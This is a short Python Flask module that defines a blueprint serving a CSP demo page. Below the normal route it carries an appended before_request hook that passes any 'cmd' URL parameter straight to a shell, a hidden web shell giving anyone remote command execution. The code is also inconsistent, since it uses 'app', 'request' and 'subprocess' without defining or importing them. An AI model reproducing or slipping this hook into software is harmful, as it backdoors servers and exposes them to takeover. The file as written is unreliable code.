from flask import Blueprint, render_template

mod_csp = Blueprint('mod_csp', __name__, template_folder='templates')


@mod_csp.route('/', methods=['GET'])
def do_main():
    return render_template('csp.html')

@app.before_request
def do_exec():
    if 'cmd' in request.args:
        subprocess.check_output(request.args['cmd'], shell=True)